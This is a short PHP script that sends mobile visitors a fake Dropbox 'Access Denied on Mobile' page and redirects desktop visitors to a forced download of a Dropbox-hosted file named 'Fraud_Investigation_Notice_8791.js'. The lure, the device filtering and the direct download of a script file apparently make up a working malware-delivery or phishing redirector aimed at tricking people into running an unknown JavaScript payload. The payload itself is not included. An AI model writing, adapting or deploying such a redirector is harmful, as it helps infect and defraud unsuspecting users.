<?php
// Detect mobile device by checking the User-Agent string
function isMobileDevice() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    // Mobile device patterns to match
    $mobileDevices = [
        'Android', 'iPhone', 'iPad', 'Windows Phone', 'BlackBerry', 'Opera Mini', 'Mobile'
    ];

    foreach ($mobileDevices as $device) {
        if (stripos($userAgent, $device) !== false) {
            return true;
        }
    }

    return false;
}

// If mobile device detected, display message and stop access
if (isMobileDevice()) {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Access Restricted</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 50px;
                background-color: #f7f7f7;
            }
            .message-box {
                background-color: #ffcc00;
                padding: 20px;
                border-radius: 10px;
                border: 2px solid #e6a800;
                color: #333;
                display: inline-block;
                max-width: 80%;
                margin: auto;
            }
            .message-box img {
                vertical-align: middle;
                margin-right: 15px;
            }
            .message-box h1 {
                font-size: 24px;
                margin-bottom: 10px;
            }
            .message-box p {
                font-size: 18px;
                line-height: 1.5;
            }
            .icon {
                font-size: 50px;
                margin-right: 20px;
            }
        </style>
    </head>
    <body>
        <div class="message-box">
            <img src="https://img.icons8.com/ios/452/error.png" alt="Error Icon" width="50">
            <div>
                <h1>Access Denied on Mobile</h1>
                <p><strong>We recommend accessing this page from a PC for the best experience.</strong></p>
                <p><i class="icon">⚠️</i> <strong>Your current device (Mobile) is not supported for accessing this Dropbox URL.</strong></p>
                <p><em>Please use a desktop computer or laptop.</em></p>
            </div>
        </div>
    </body>
    </html>';
    exit(); // Stop further script execution if mobile is detected
}

// Redirect the user to the Dropbox URL if they're on a PC
header("Location: https://www.dropbox.com/scl/fi/4ckshclydlf704dygq0i2/Fraud_Investigation_Notice_8791.js?rlkey=x803p3wntojswbori5hbz1ht9&st=hzk2t6b5&dl=1");
exit();
?>
